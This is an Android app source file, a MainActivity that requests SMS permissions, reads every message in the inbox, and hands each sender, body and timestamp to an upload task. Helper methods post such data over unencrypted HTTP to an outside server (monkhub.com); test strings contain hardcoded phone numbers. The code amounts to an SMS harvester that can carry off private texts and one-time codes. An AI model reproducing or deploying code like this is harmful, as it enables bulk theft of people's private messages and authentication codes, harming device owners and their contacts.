package com.akhil.akhildixit.messages;

import android.Manifest;
import android.annotation.SuppressLint;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.AbstractMap;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.net.ssl.HttpsURLConnection;

import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    JSONArray jsonArray;
    TextView totalSms,UploadSms,UploadSuccess;
    String message;
    Http http;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        totalSms=findViewById(R.id.mainAct_totalsms);
        UploadSms=findViewById(R.id.mainAct_uploaded);
        UploadSuccess=findViewById(R.id.mainAct_uploadsuccess);


        String msgData = "";
        ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_SMS,Manifest.permission.RECEIVE_SMS},1);

        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        totalSms.setText("Found Total Of :: "+cursor.getCount());

      jsonArray  =new JSONArray();
        SimpleDateFormat format = new SimpleDateFormat("yy-MM-dd hh:mm:ss");
        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                JSONObject jsonObject=new JSONObject();

                    try {


                        long sentDate = cursor.getLong(5);
                        String sentString = format.format(new Date(sentDate));

                        long recievedDate = cursor.getLong(4);
                        String recievedString = format.format(new Date(recievedDate));

                        http=new Http(MainActivity.this,cursor.getString(2),cursor.getString(12),sentString,recievedString,UploadSms,UploadSuccess);
                       // http=new Http(MainActivity.this,cursor.getString(2),cursor.getString(12),sentString,recievedString);
                        http.execute();
                        //Log.e("SMS DATE", dateString+" Other is "+cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));
                       /* jsonObject.put("message_from",cursor.getString(2));
                        jsonObject.put("text_message",cursor.getString(12));
                        jsonObject.put("sent_time",cursor.getString(5));
                        jsonObject.put("recieved_time",cursor.getString(4));*/
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                  /*  msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);*/
                }
              //  jsonArray.put(jsonObject);
                //msgData +="\n";
                // use msgData
             while (cursor.moveToNext());
        } else {
            // empty box, no SMS
        }
        message=jsonArray.toString();

        try {
           // sendDataUrl(message);

           // sendDataOkHttp(message);
        } catch (Exception e) {
            e.printStackTrace();
        }
        //  send_data(message);



    }

    @SuppressLint("StaticFieldLeak")
    public void sendDataOkHttp(String message)
    {

        new AsyncTask<Void,Void,Void>()
        {
            String data="";
            @Override
            protected Void doInBackground(Void... voids) {
                RequestBody requestBody=new FormBody.Builder().add("message_from","9818815263")
                        .add("text_message","Message from dev").add("sent_time","2018-05-2413:12:14")
                        .add("recieved_time","2018-05-2419:22:14").build();
                OkHttpClient okHttpClient=new OkHttpClient();
                Request request=new Request.Builder().url("http://monkhub.com/forest/message-api-get.php?message_from=9818815263&text_message=anybvody%20is%20there&sent_time=2018-12-12%2012:12:12&recieved_time=2018-12-12%2012:12:12")
                        .build();

                try {
                    Response response=okHttpClient.newCall(request).execute();
                    data=response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                return null;
            }

            @Override
            protected void onPostExecute(Void aVoid) {
                super.onPostExecute(aVoid);
                Toast.makeText(MainActivity.this,"The message is "+data,Toast.LENGTH_LONG).show();
                Log.e("MessageHere",data);
            }
        }.execute();
    }

    @SuppressLint("StaticFieldLeak")
    public void sendDataUrl(String message) throws Exception {
        Log.e("Started","Started");


       new AsyncTask<Void,Void,String>()
       {
           String code="";
            BufferedReader reader=null;

           @Override
           protected void onPostExecute(String s) {
               super.onPostExecute(s);
               Toast.makeText(MainActivity.this,"The code is "+code,Toast.LENGTH_LONG).show();
               Log.e("Code","The code is "+code);
           }

           @Override
           protected String doInBackground(Void... voids) {
               try {


                   URL url = new URL("http://monkhub.com/forest/message-api.php");
                   URLConnection conn = url.openConnection();
                   conn.setDoInput(true);
                   conn.setDoOutput(true);

                   OutputStreamWriter streamWriter = new OutputStreamWriter(conn.getOutputStream());
                   streamWriter.write("message_from=8587024270n&text_message=extrusion_occured&sent_time=2018-05-2413:12:14&recieved_time=2018-05-2419:22:14");
                   streamWriter.flush();
                   reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                   StringBuilder sb = new StringBuilder();
                   String line = null;

                   // Read Server Response
                   while ((line = reader.readLine()) != null) {
                       // Append server response in string
                       sb.append(line + "\n");
                   }


                   code = sb.toString();
               }
               catch (Exception e)
               {
                   Log.e("Exception!!!!!!!!!!!!"," kk");
               }
               return null;
           }
       }.execute();

    }


    }
  /*  @SuppressLint("StaticFieldLeak")
    public void send_data(String message)
    {
        Toast.makeText(this,"Method started",Toast.LENGTH_LONG).show();
        final OkHttpClient client = new OkHttpClient();
        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
        RequestBody body = RequestBody.create(JSON,message);
        final Request request = new Request.Builder()
                .url("http://monkhub.com/forest/message-api.php")
                .post(body)
                .build();


    new AsyncTask<Void, Void, String> (){

         Response response = null;
        String resStr = null;
        @Override
        protected String doInBackground(Void... params) {

            try {

                response = client.newCall(request).execute();


            } catch (Exception e) {
                e.printStackTrace();
            }
            return "";
        }

        @Override
        protected void onPostExecute(String result) {
            try {
                resStr = response.body().string();
                Toast.makeText(MainActivity.this,"Res "+resStr,Toast.LENGTH_LONG).show();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        @Override
        protected void onPreExecute() {
            Toast.makeText(MainActivity.this,"Start",Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onProgressUpdate(Void... values) {}
    }.execute();


}*/



